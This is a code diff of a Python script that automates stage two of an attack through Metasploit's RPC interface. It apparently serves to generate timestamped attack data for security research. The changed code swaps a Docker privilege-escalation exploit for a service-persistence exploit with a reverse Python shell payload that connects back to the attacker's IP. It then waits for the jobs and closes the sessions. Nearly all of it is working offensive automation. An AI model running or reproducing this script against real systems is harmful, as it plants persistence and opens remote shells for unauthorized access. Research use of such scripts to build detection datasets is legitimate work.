@@ -12,7 +12,7 @@ def record_timestamp(folder, output_time_file):
 
 def main(argv):
     if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
@@ -20,17 +20,24 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['SESSION'] = 1
+    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
+    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+    exploit['SESSION'] = 2
+    exploit['VERBOSE'] = True
+    payload['LHOST'] = my_ip
 
     time.sleep(2)
     output_time_file = 'time_stage_2_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-    #print('Start 2')
 
     exploit.execute(payload=payload)
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    client.sessions.session('2').stop()
+    client.sessions.session('3').stop()
 
     time.sleep(10)
     output_time_file = 'time_stage_2_end.txt'
